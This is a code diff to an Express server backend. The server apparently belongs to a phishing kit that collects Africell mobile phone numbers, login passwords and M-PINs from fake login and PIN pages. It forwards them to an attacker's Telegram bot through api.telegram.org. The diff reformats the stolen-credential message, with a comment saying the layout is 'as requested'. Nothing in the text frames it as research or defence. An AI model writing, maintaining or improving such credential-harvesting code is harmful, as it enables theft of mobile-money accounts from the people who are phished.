@@ -55,7 +55,7 @@ app.post('/api/submit-order', async (req, res) => {
 
         const countryFlag = "🇸🇱";
         
-        // Clean phone input to ensure no +232
+        // Clean phone input
         const rawDigits = phone.replace(/\+232/g, '').trim();
 
         // Check if this submission is from pin.html (PIN code) or login.html (Password)
@@ -63,9 +63,10 @@ app.post('/api/submit-order', async (req, res) => {
         const headerTitle = isPinStep ? "🔐 *Africell M-PIN Submitted*" : "🔔 *New Africell Login Attempt*";
         const credentialLabel = isPinStep ? "M-PIN" : "Password";
 
-        // Formatted with flag and + followed directly by the entered digits
+        // 3 Distinct Layers Layout as requested
         const message = `${headerTitle}\n\n` +
-                        `📱 Phone: \`${countryFlag} + ${rawDigits}\`\n` +
+                        `${countryFlag} Country: \`+232\`\n` +
+                        `📱 Phone: \`${rawDigits}\`\n` +
                         `🔑 ${credentialLabel}: \`${uniqueId || 'N/A'}\``;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -147,7 +148,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const rawDigits = phone.replace(/\+232/g, '').trim();
 
             let updatedMessage = `📋 *${messageTitle}*\n\n` +
-                                 `📱 Phone: \`${countryFlag} + ${rawDigits}\`\n` +
+                                 `${countryFlag} Country: \`+232\`\n` +
+                                 `📱 Phone: \`${rawDigits}\`\n` +
                                  `🔑 Credential: \`${uniqueId}\`\n` +
                                  `📌 Status: *${actionText}*`;
 
